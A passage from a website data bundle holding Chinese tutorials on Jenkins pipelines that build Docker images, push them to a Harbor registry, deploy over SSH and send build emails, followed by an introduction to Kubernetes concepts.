style="font-size: 11pt; font-family: tahoma, arial, helvetica, sansserif">\n            <tr>\n                <td>(本邮件是程序自动下发的，请勿回复！)</td>\n            </tr>\n            <tr>\n                <td><h2>\n                    <font color="#0000ff">构建结果 - ${build_status}</font>\n                </h2></td>\n            </tr>\n            <tr>\n                <td><br/>\n                    <b><font color="#0b610b">构建信息</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>项目名称&nbsp;：&nbsp;${project_name}</li>\n                        <li>构建编号&nbsp;：&nbsp;第${build_number}次构建</li>\n                        <li>触发原因：&nbsp;${cause}</li>\n                        <li>构建日志：&nbsp;\n                            <a href="${build_url}console">${build_url}console</a>\n                        </li>\n                        <li>构建&nbsp;&nbsp;url&nbsp;：&nbsp;\n                            <a href="${build_url}">${build_url}</a>\n                        </li>\n                        <li>工作目录&nbsp;：&nbsp;\n                            <a href="${project_url}ws">${project_url}ws</a>\n                        </li>\n                        <li>项目&nbsp;&nbsp;url&nbsp;：&nbsp;\n                            <a href="${project_url}">${project_url}</a>\n                        </li>\n                    </ul>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0b610b">changes since last successful build:</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>历史变更记录 : <a href="${project_url}changes">${project_url}changes</a></li>\n                    </ul>\n                    ${changes_since_last_success,reverse=true, format="changes for build #%n:<br/>%c<br/>",showpaths=true,changesformat="<pre>[%a]<br/>%m</pre>",pathformat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n                </td>\n            </tr>\n            <tr>\n                <td><b>failed test results</b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <pre style="font-size: 11pt; font-family: tahoma, arial, helvetica,sans-serif">\n                        $failed_tests\n                    </pre>\n                    <br/>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0b610b">构建日志 (最后 100行):</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <textarea cols="80" rows="30" readonly="readonly"\n                              style="font-family: courier new">\n                        ${build_log,maxlines=100}\n                    </textarea>\n                </td>\n            </tr>\n        </table>\n        </body>\n        </html>\'\'\', mimetype: \'text/html\', subject: \'43243214321\', to: \'875730567@qq.com\'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n\n\n\n# jenkins 自动化服务拉取镜像并启动\n\n这部操作需要安装一个 publish over ssh 插件，安装好后在 manager jenkins -> configure system 进行配置\n\n\n\n更改 jenkinsfile 脚本，添加远程机器拉取镜像并启动容器，具体语法怎么使用，可以到 流水线语法中查看\n\n\n\nnode {\n    // 版本\n    def tag = "1.0"\n    // 镜像仓库的地址\n    def harbor_url = "192.168.81.102:85"\n    // 镜像仓库的项目,这里建议项目名称和jenkins的item项目名称、以及harbor的项目名称保持一致，否则用一下脚本会出问题\n    def harbor_project = "demo"\n\n    // 拉取代码\n    stage(\'pull code\') {\n        checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // 编译并推送镜像仓库\n    stage(\'build project\') {\n        if  ("${project_name}" ==  \'demo\' ) {\n            echo \'打包根目录\'\n            sh \'mvn clean package dockerfile:build\'\n        } else {\n            echo  "打包子目录 ${project_name}"\n            sh "mvn -f ${project_name} clean package dockerfile:build"\n        }\n        echo "把jar上传镜像仓库"\n        def oldimagename = "${project_name}:latest"\n        def newimagename = "${harbor_url}/${harbor_project}/${project_name}:${tag}"\n        // 改名称 做规范\n        sh "docker tag ${oldimagename} ${newimagename}"\n        // 删除之前的 镜像\n        sh "docker rmi ${oldimagename}"\n        // 推送到 dockers仓库\n        withcredentials([usernamepassword(credentialsid: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordvariable: \'harbor_password\', usernamevariable: \'harbor_account\')]) {\n            // 登录\n            sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n            // 上传\n            sh "docker push ${newimagename}"\n            echo "镜像推送成功"\n        }\n\n        // 远程调用脚本,port 最好也添加 jenkins项目配置里的参数配置，作为参数传进来\n        echo "执行远程命令 /home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}"\n        sshpublisher(publishers: [sshpublisherdesc(configname: \'test_103\', transfers: [sshtransfer(cleanremote: false, excludes: \'\', execcommand: "/home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}", exectimeout: 120000, flatten: false, makeemptydirs: false, nodefaultexcludes: false, patternseparator: \'[, ]+\', remotedirectory: \'\', remotedirectorysdf: false, removeprefix: \'\', sourcefiles: \'\')], usepromotiontimestamp: false, useworkspaceinpromotion: false, verbose: false)])\n\n    }\n    // 发送邮件\n    stage(\'send email\') {\n        emailext body: \'\'\'<!doctype html>\n        <html>\n        <head>\n            <meta charset="utf-8">\n            <title>${env, var="job_name"}-第${build_number}次构建日志</title>\n        </head>\n        <body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n        <table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: tahoma, arial, helvetica, sansserif">\n            <tr>\n                <td>(本邮件是程序自动下发的，请勿回复！)</td>\n            </tr>\n            <tr>\n                <td><h2>\n                    <font color="#0000ff">构建结果 - ${build_status}</font>\n                </h2></td>\n            </tr>\n            <tr>\n                <td><br/>\n                    <b><font color="#0b610b">构建信息</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>项目名称&nbsp;：&nbsp;${project_name}</li>\n                        <li>构建编号&nbsp;：&nbsp;第${build_number}次构建</li>\n                        <li>触发原因：&nbsp;${cause}</li>\n                        <li>构建日志：&nbsp;\n                            <a href="${build_url}console">${build_url}console</a>\n                        </li>\n                        <li>构建&nbsp;&nbsp;url&nbsp;：&nbsp;\n                            <a href="${build_url}">${build_url}</a>\n                        </li>\n                        <li>工作目录&nbsp;：&nbsp;\n                            <a href="${project_url}ws">${project_url}ws</a>\n                        </li>\n                        <li>项目&nbsp;&nbsp;url&nbsp;：&nbsp;\n                            <a href="${project_url}">${project_url}</a>\n                        </li>\n                    </ul>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0b610b">changes since last successful build:</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <ul>\n                        <li>历史变更记录 : <a href="${project_url}changes">${project_url}changes</a></li>\n                    </ul>\n                    ${changes_since_last_success,reverse=true, format="changes for build #%n:<br/>%c<br/>",showpaths=true,changesformat="<pre>[%a]<br/>%m</pre>",pathformat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n                </td>\n            </tr>\n            <tr>\n                <td><b>failed test results</b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <pre style="font-size: 11pt; font-family: tahoma, arial, helvetica,sans-serif">\n                        $failed_tests\n                    </pre>\n                    <br/>\n                </td>\n            </tr>\n            <tr>\n                <td><b><font color="#0b610b">构建日志 (最后 100行):</font></b>\n                    <hr size="2" width="100%" align="center"/>\n                </td>\n            </tr>\n            <tr>\n                <td>\n                    <textarea cols="80" rows="30" readonly="readonly"\n                              style="font-family: courier new">\n                        ${build_log,maxlines=100}\n                    </textarea>\n                </td>\n            </tr>\n        </table>\n        </body>\n        </html>\'\'\', mimetype: \'text/html\', subject: \'43243214321\', to: \'875730567@qq.com\'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n\n\n重新构建，其他服务器就会自动拉取了。\n\n> 其他服务器一定要有 jenkins 服务器的公钥，构建过程 ssh 不会输出任何信息只会告诉你 exec 执行了多久，需要自己去测一下。\n\n\n# vue 前端使用 jenkins 部署\n\n1. 首先需要安装 nodejs 插件\n2. 到 manager jenkins->global tool configuration->nodejs\n\n\n\n3. 创建一个流水线的前端项目，根据脚本把配置补全\n\nnode {\n    stage(\'拉取代码\') {\n        checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test_vue.git\']]])\n    }\n    stage(\'打包，部署网站\') {\n        //使用nodejs的npm进行打包，这个和 以上的 name 保持一致\n        nodejs(\'nodejs12\'){\n            sh \'\'\'\n                npm install\n                npm run build\n            \'\'\'\n        }\n        //=====以下为远程调用进行项目部署========\n        sshpublisher(publishers: [sshpublisherdesc(configname: \'master_server\',transfers: [sshtransfer(cleanremote: false, excludes: \'\', execcommand: \'\',exectimeout: 120000, flatten: false, makeemptydirs: false, nodefaultexcludes:false, patternseparator: \'[, ]+\', remotedirectory: \'/usr/share/nginx/html\',remotedirectorysdf: false, removeprefix: \'dist\', sourcefiles: \'dist/**\')],usepromotiontimestamp: false, useworkspaceinpromotion: false, verbose: false)])\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n从脚本中可以看出，我们需要一个 branch 参数，还要配置 前端项目的 远程 server 地址\n\n> 这里没有使用 execcommand 的命令，而是通过 sourcefiles、removeprefix、remotedirectory，sourcefiles 代表我们 copy 哪个文件，remotedirectory 远程目录，特就是 copy 到 nginx 所在目录\n> 57-62',charsets:{cjk:!0}},{title:"Jenkins(八) Jenkins+Docker+SpringCloud微服务持续集成（下）",frontmatter:{title:"Jenkins(八) Jenkins+Docker+SpringCloud微服务持续集成（下）",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/507",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/50.Jenkins/507.Jenkins(%E5%85%AB)%20Jenkins+Docker+SpringCloud%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%EF%BC%88%E4%B8%8B%EF%BC%89.html",relativePath:"01.运维/50.Jenkins/507.Jenkins(八) Jenkins+Docker+SpringCloud微服务持续集成（下）.md",key:"v-4b59fa74",path:"/jenkins/507/",headers:[{level:2,title:"优化Jenkins工程中可以选择多个微服务",slug:"优化jenkins工程中可以选择多个微服务",normalizedTitle:"优化 jenkins 工程中可以选择多个微服务",charIndex:176},{level:2,title:"优化Jenkins工程中可以选择多台生产服务器",slug:"优化jenkins工程中可以选择多台生产服务器",normalizedTitle:"优化 jenkins 工程中可以选择多台生产服务器",charIndex:269},{level:2,title:"脚本编写",slug:"脚本编写",normalizedTitle:"脚本编写",charIndex:409}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"优化Jenkins工程中可以选择多个微服务 优化Jenkins工程中可以选择多台生产服务器 脚本编写",content:'第七章中部署方案存在的问题：\n\n 1. 一次只能选择一个微服务部署\n 2. 只有一台生产者部署服务器\n 3. 每个微服务只有一个实例，容错率低\n\n优化方案：\n\n 1. 在一个 Jenkins 工程中可以选择多个微服务同时发布\n 2. 在一个 Jenkins 工程中可以选择多台生产服务器同时部署\n 3. 每个微服务都是以集群高可用形式部署\n\n\n\n\n# 优化 Jenkins 工程中可以选择多个微服务\n\n安装 Extended Choice Parameter 插件，到项目配置中，可以看到选择参数多了一个选项\n\n\n\n\n\n\n\n\n\n\n\n\n# 优化 Jenkins 工程中可以选择多台生产服务器\n\n1. 在 Manager Jenkins->Configure System->Publish over SSH-> 在添加服务器\n\n\n\n2. 在到项目配置中添加服务器选择，和工程中选择多个微服务是类似的\n\n\n\n\n\n\n\n\n# 脚本编写\n\n// 版本\ndef tag = "1.0"\n// 镜像仓库的地址\ndef harbor_url = "192.168.81.102:85"\n// 镜像仓库的项目,这里建议项目名称和jenkins的item项目名称、以及harbor的项目名称保持一致，否则用一下脚本会出问题\ndef harbor_project = "demo"\n\nnode {\n\n    // 获取当前选择的项目名称\n    def selectDProjectName = "${project_name}".split(",")\n    // 获取服务器列表\n    def selectDServers = "${publish_server}".split(",")\n\n    // 拉取代码\n    stage(\'pull code\') {\n        checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // 编译并推送镜像仓库\n    stage(\'build project\') {\n\n        for(int i=0;i<selectDProjectName.length;i++){\n\n            def project = selectDProjectName[i].split("@")[0]\n            def port = selectDProjectName[i].split("@")[1]\n            // 编译\n            sh "mvn -f ${project} clean package dockerfile:build"\n            echo "把jar上传镜像仓库"\n            def oldImageName = "${project}:latest"\n            def newImageName = "${harbor_url}/${harbor_project}/${project}:${tag}"\n            // 改名称 做规范\n            sh "docker tag ${oldImageName} ${newImageName}"\n            // 删除之前的 镜像\n            sh "docker rmi ${oldImageName}"\n            // 推送到 dockers仓库\n            withCredentials([usernamePassword(credentialsId: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordVariable: \'harbor_password\', usernameVariable: \'harbor_account\')]) {\n                // 登录\n                sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n                // 上传\n                sh "docker push ${newImageName}"\n                echo "镜像推送成功"\n            }\n            for(int k=0;k<selectDServers.length;k++){\n                // 获取服务器名称\n                def currentServerName = selectDServers[k]\n                echo "执行远程命令 /home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}"\n                sshPublisher(publishers: [sshPublisherDesc(configName: "${currentServerName}", transfers: [sshTransfer(cleanRemote: false, excludes: \'\', execCommand: "/home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}", execTimeout: 120000, flatten: false, makeEmptyDirs: false, noDefaultExcludes: false, patternSeparator: \'[, ]+\', remoteDirectory: \'\', remoteDirectorySDF: false, removePrefix: \'\', sourceFiles: \'\')], usePromotionTimestamp: false, useWorkspaceInPromotion: false, verbose: false)])\n\n            }\n        }\n    }\n}\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n',normalizedContent:'第七章中部署方案存在的问题：\n\n 1. 一次只能选择一个微服务部署\n 2. 只有一台生产者部署服务器\n 3. 每个微服务只有一个实例，容错率低\n\n优化方案：\n\n 1. 在一个 jenkins 工程中可以选择多个微服务同时发布\n 2. 在一个 jenkins 工程中可以选择多台生产服务器同时部署\n 3. 每个微服务都是以集群高可用形式部署\n\n\n\n\n# 优化 jenkins 工程中可以选择多个微服务\n\n安装 extended choice parameter 插件，到项目配置中，可以看到选择参数多了一个选项\n\n\n\n\n\n\n\n\n\n\n\n\n# 优化 jenkins 工程中可以选择多台生产服务器\n\n1. 在 manager jenkins->configure system->publish over ssh-> 在添加服务器\n\n\n\n2. 在到项目配置中添加服务器选择，和工程中选择多个微服务是类似的\n\n\n\n\n\n\n\n\n# 脚本编写\n\n// 版本\ndef tag = "1.0"\n// 镜像仓库的地址\ndef harbor_url = "192.168.81.102:85"\n// 镜像仓库的项目,这里建议项目名称和jenkins的item项目名称、以及harbor的项目名称保持一致，否则用一下脚本会出问题\ndef harbor_project = "demo"\n\nnode {\n\n    // 获取当前选择的项目名称\n    def selectdprojectname = "${project_name}".split(",")\n    // 获取服务器列表\n    def selectdservers = "${publish_server}".split(",")\n\n    // 拉取代码\n    stage(\'pull code\') {\n        checkout([$class: \'gitscm\', branches: [[name: \'*/${branch}\']], extensions: [], userremoteconfigs: [[credentialsid: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n    }\n    // 编译并推送镜像仓库\n    stage(\'build project\') {\n\n        for(int i=0;i<selectdprojectname.length;i++){\n\n            def project = selectdprojectname[i].split("@")[0]\n            def port = selectdprojectname[i].split("@")[1]\n            // 编译\n            sh "mvn -f ${project} clean package dockerfile:build"\n            echo "把jar上传镜像仓库"\n            def oldimagename = "${project}:latest"\n            def newimagename = "${harbor_url}/${harbor_project}/${project}:${tag}"\n            // 改名称 做规范\n            sh "docker tag ${oldimagename} ${newimagename}"\n            // 删除之前的 镜像\n            sh "docker rmi ${oldimagename}"\n            // 推送到 dockers仓库\n            withcredentials([usernamepassword(credentialsid: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordvariable: \'harbor_password\', usernamevariable: \'harbor_account\')]) {\n                // 登录\n                sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n                // 上传\n                sh "docker push ${newimagename}"\n                echo "镜像推送成功"\n            }\n            for(int k=0;k<selectdservers.length;k++){\n                // 获取服务器名称\n                def currentservername = selectdservers[k]\n                echo "执行远程命令 /home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}"\n                sshpublisher(publishers: [sshpublisherdesc(configname: "${currentservername}", transfers: [sshtransfer(cleanremote: false, excludes: \'\', execcommand: "/home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}", exectimeout: 120000, flatten: false, makeemptydirs: false, nodefaultexcludes: false, patternseparator: \'[, ]+\', remotedirectory: \'\', remotedirectorysdf: false, removeprefix: \'\', sourcefiles: \'\')], usepromotiontimestamp: false, useworkspaceinpromotion: false, verbose: false)])\n\n            }\n        }\n    }\n}\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n',charsets:{cjk:!0}},{title:"kubernetes(一) 概念及介绍",frontmatter:{title:"kubernetes(一) 概念及介绍",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/600",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/600.kubernetes(%E4%B8%80)%20%E6%A6%82%E5%BF%B5%E5%8F%8A%E4%BB%8B%E7%BB%8D.html",relativePath:"01.运维/60.Kubernetes/600.kubernetes(一) 概念及介绍.md",key:"v-4d0793a3",path:"/kubernetes/600/",headers:[{level:2,title:"1.1 应用部署方式演变",slug:"_1-1-应用部署方式演变",normalizedTitle:"1.1 应用部署方式演变",charIndex:2},{level:2,title:"1.2 kubernetes简介",slug:"_1-2-kubernetes简介",normalizedTitle:"1.2 kubernetes 简介",charIndex:661},{level:2,title:"1.3 kubernetes组件",slug:"_1-3-kubernetes组件",normalizedTitle:"1.3 kubernetes 组件",charIndex:1085},{level:2,title:"1.4 kubernetes概念",slug:"_1-4-kubernetes概念",normalizedTitle:"1.4 kubernetes 概念",charIndex:2074}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"1.1 应用部署方式演变 1.2 kubernetes简介 1.3 kubernetes组件 1.4 kubernetes概念",content:"# 1.1 应用部署方式演变\n\n在部署应用程序的方式上，主要经历了三个时代：\n\n * 传统部署：互联网早期，会直接将应用程序部署在物理机上\n   \n   > 优点：简单，不需要其它技术的参与\n   > 缺点：不能为应用程序定义资源使用边界，很难合理地分配计算资源，而且程序之间容易产生影响\n\n * 虚拟化部署：可以在一台物理机上运行多个虚拟机，每个虚拟机都是独立的一个环境\n   \n   > 优点：程序环境不会相互产生影响，提供了一定程度的安全性\n   > 缺点：增加了操作系统，浪费了部分资源\n\n * 容器化部署：与虚拟化类似，但是共享了操作系统\n   \n   > 优点：\n   > 可以保证每个容器拥有自己的文件系统、CPU、内存、进程空间等\n   > 运行应用程序所需要的资源都被容器包装，并和底层基础架构解耦\n   > 容器化的应用程序可以跨云服务商、跨 Linux 操作系统发行版进行部署\n\n\n\n容器化部署方式给带来很多的便利，但是也会出现一些问题，比如说：\n\n * 一个容器故障停机了，怎么样让另外一个容器立刻启动去替补停机的容器\n * 当并发访问量变大的时候，怎么样做到横向扩展容器数量\n\n这些容器管理的问题统称为容器编排问题，为了解决这些容器编排问题，就产生了一些容器编排的软件：\n\n * Swarm：Docker 自己的容器编排工具\n * Mesos：Apache 的一个资源统一管控的工具，需要和 Marathon 结合使用\n * Kubernetes：Google 开源的的容器编排工具\n\n\n\n\n# 1.2 kubernetes 简介\n\n\n\nkubernetes，是一个全新的基于容器技术的分布式架构领先方案，是谷歌严格保密十几年的秘密武器 ----Borg 系统的一个开源版本，于 2014 年 9 月发布第一个版本，2015 年 7 月发布第一个正式版本。\n\nkubernetes 的本质是一组服务器集群，它可以在集群的每个节点上运行特定的程序，来对节点中的容器进行管理。目的是实现资源管理的自动化，主要提供了如下的主要功能：\n\n * 自我修复：一旦某一个容器崩溃，能够在 1 秒中左右迅速启动新的容器\n * 弹性伸缩：可以根据需要，自动对集群中正在运行的容器数量进行调整\n * 服务发现：服务可以通过自动发现的形式找到它所依赖的服务\n * 负载均衡：如果一个服务起动了多个容器，能够自动实现请求的负载均衡\n * 版本回退：如果发现新发布的程序版本有问题，可以立即回退到原来的版本\n * 存储编排：可以根据容器自身的需求自动创建存储卷\n\n\n# 1.3 kubernetes 组件\n\n一个 kubernetes 集群主要是由控制节点 (master)、** 工作节点 (node)** 构成，每个节点上都会安装不同的组件。\n\nmaster：集群的控制平面，负责集群的决策 (管理)\n\n> ApiServer : 资源操作的唯一入口，接收用户输入的命令，提供认证、授权、API 注册和发现等机制\n> Scheduler : 负责集群资源调度，按照预定的调度策略将 Pod 调度到相应的 node 节点上\n> ControllerManager : 负责维护集群的状态，比如程序部署安排、故障检测、自动扩展、滚动更新等\n> Etcd ：负责存储集群中各种资源对象的信息\n\nnode：集群的数据平面，负责为容器提供运行环境 (干活)\n\n> Kubelet : 负责维护容器的生命周期，即通过控制 docker，来创建、更新、销毁容器\n> KubeProxy : 负责提供集群内部的服务发现和负载均衡\n> Docker : 负责节点上容器的各种操作\n\n\n\n下面，以部署一个 nginx 服务来说明 kubernetes 系统各个组件调用关系：\n\n 1. 首先要明确，一旦 kubernetes 环境启动之后，master 和 node 都会将自身的信息存储到 etcd 数据库中\n 2. 一个 nginx 服务的安装请求会首先被发送到 master 节点的 apiServer 组件\n 3. apiServer 组件会调用 scheduler 组件来决定到底应该把这个服务安装到哪个 node 节点上，在此时，它会从 etcd 中读取各个 node 节点的信息，然后按照一定的算法进行选择，并将结果告知 apiServer\n 4. apiServer 调用 controller-manager 去调度 Node 节点安装 nginx 服务\n 5. kubelet 接收到指令后，会通知 docker，然后由 docker 来启动一个 nginx 的 pod，pod 是 kubernetes 的最小操作单元，容器必须跑在 pod 中至此，\n 6. 一个 nginx 服务就运行了，如果需要访问 nginx，就需要通过 kube-proxy 来对 pod 产生访问的代理这样，外界用户就可以访问集群中的 nginx 服务了\n\n\n# 1.4 kubernetes 概念\n\nMaster：集群控制节点，每个集群需要至少一个 master 节点负责集群的管控\nNode：工作负载节点，由 master 分配容器到这些 node 工作节点上，然后 node 节点上的 docker 负责容器的运行\nPod：kubernetes 的最小控制单元，容器都是运行在 pod 中的，一个 pod 中可以有 1 个或者多个容器\nController：控制器，通过它来实现对 pod 的管理，比如启动 pod、停止 pod、伸缩 pod 的数量等等\nService：pod 对外服务的统一入口，下面可以维护者同一类的多个 pod\nLabel：标签，用于对 pod 进行分类，同一类 pod 会拥有相同的标签\nNameSpace：命名空间，用来隔离 pod 的运行环境\n\n",normalizedContent:"# 1.1 应用部署方式演变\n\n在部署应用程序的方式上，主要经历了三个时代：\n\n * 传统部署：互联网早期，会直接将应用程序部署在物理机上\n   \n   > 优点：简单，不需要其它技术的参与\n   > 缺点：不能为应用程序定义资源使用边界，很难合理地分配计算资源，而且程序之间容易产生影响\n\n * 虚拟化部署：可以在一台物理机上运行多个虚拟机，每个虚拟机都是独立的一个环境\n   \n   > 优点：程序环境不会相互产生影响，提供了一定程度的安全性\n   > 缺点：增加了操作系统，浪费了部分资源\n\n * 容器化部署：与虚拟化类似，但是共享了操作系统\n   \n   > 优点：\n   > 可以保证每个容器拥有自己的文件系统、cpu、内存、进程空间等\n   > 运行应用程序所需要的资源都被容器包装，并和底层基础架构解耦\n   > 容器化的应用程序可以跨云服务商、跨 linux 操作系统发行版进行部署\n\n\n\n容器化部署方式给带来很多的便利，但是也会出现一些问题，比如说：\n\n * 一个容器故障停机了，怎么样让另外一个容器立刻启动去替补停机的容器\n * 当并发访问量变大的时候，怎么样做到横向扩展容器数量\n\n这些容器管理的问题统称为容器编排问题，为了解决这些容器编排问题，就产生了一些容器编排的软件：\n\n * swarm：docker 自己的容器编排工具\n * mesos：apache 的一个资源统一管控的工具，需要和 marathon 结合使用\n * kubernetes：google 开源的的容器编排工具\n\n\n\n\n# 1.2 kubernetes 简介\n\n\n\nkubernetes，是一个全新的基于容器技术的分布式架构领先方案，是谷歌严格保密十几年的秘密武器 ----borg 系统的一个开源版本，于 2014 年 9 月发布第一个版本，2015 年 7 月发布第一个正式版本。\n\nkubernetes 的本质是一组服务器集群，它可以在集群的每个节点上运行特定的程序，来对节点中的容器进行管理。目的是实现资源管理的自动化，主要提供了如下的主要功能：\n\n * 自我修复：一旦某一个容器崩溃，能够在 1 秒中左右迅速启动新的容器\n * 弹性伸缩：可以根据需要，自动对集群中正在运行的容器数量进行调整\n * 服务发现：服务可以通过自动发现的形式找到它所依赖的服务\n * 负载均衡：如果一个服务起动了多个容器，能够自动实现请求的负载均衡\n * 版本回退：如果发现新发布的程序版本有问题，可以立即回退到原来的版本\n * 存储编排：可以根据容器自身的需求自动创建存储卷\n\n\n# 1.3 kubernetes 组件\n\n一个 kubernetes 集群主要是由控制节点 (master)、** 工作节点 (node)** 构成，每个节点上都会安装不同的组件。\n\nmaster：集群的控制平面，负责集群的决策 (管理)\n\n> apiserver : 资源操作的唯一入口，接收用户输入的命令，提供认证、授权、api 注册和发现等机制\n> scheduler : 负责集群资源调度，按照预定的调度策略将 pod 调度到相应的 node 节点上\n> controllermanager : 负责维护集群的状态，比如程序部署安排、故障检测、自动扩展、滚动更新等\n> etcd ：负责存储集群中各种资源对象的信息\n\nnode：集群的数据平面，负责为容器提供运行环境 (干活)\n\n> kubelet : 负责维护容器的生命周期，即通过控制 docker，来创建、更新、销毁容器\n> kubeproxy : 负责提供集群内部的服务发现和负载均衡\n> docker : 负责节点上容器的各种操作\n\n\n\n下面，以部署一个 nginx 服务来说明 kubernetes 系统各个组件调用关系：\n\n 1. 首先要明确，一旦 kubernetes 环境启动之后，master 和 node 都会将自身的信息存储到 etcd 数据库中\n 2. 一个 nginx 服务的安装请求会首先被发送到 master 节点的 apiserver 组件\n 3. apiserver 组件会调用 scheduler 组件来决定到底应该把这个服务安装到哪个 node 节点上，在此时，它会从 etcd 中读取各个 node 节点的信息，然后按照一定的算法进行选择，并将结果告知 apiserver\n 4. apiserver 调用 controller-manager 去调度 node 节点安装 nginx 服务\n 5. kubelet 接收到指令后，会通知 docker，然后由 docker 来启动一个 nginx 的 pod，pod 是 kubernetes 的最小操作单元，容器必须跑在 pod 中至此，\n 6. 一个 nginx 服务就运行了，如果需要访问 nginx，就需要通过 kube-proxy 来对 pod 产生访问的代理这样，外界用户就可以访问集群中的 nginx 服务了\n\n\n# 1.4 kubernetes 概念\n\nmaster：集群控制节点，每个集群需要至少一个 master 节点负责集群的管控\nnode：工作负载节点，由 master 分配容器到这些 node 工作节点上，然后 node 节点上的 docker 负责容器的运行\npod：kubernetes 的最小控制单元，容器都是运行在 pod 中的，一个 pod 中可以有 1 个或者多个容器\ncontroller：控制器，通过它来实现对 pod 的管理，比如启动 pod、停止 pod、伸缩 pod 的数量等等\nservice：pod 对外服务的统一入口，下面可以维护者同一类的多个 pod\nlabel：标签，用于对 pod 进行分类，同一类 pod 会拥有相同的标签\nnamespace：命名空间，用来隔离 pod 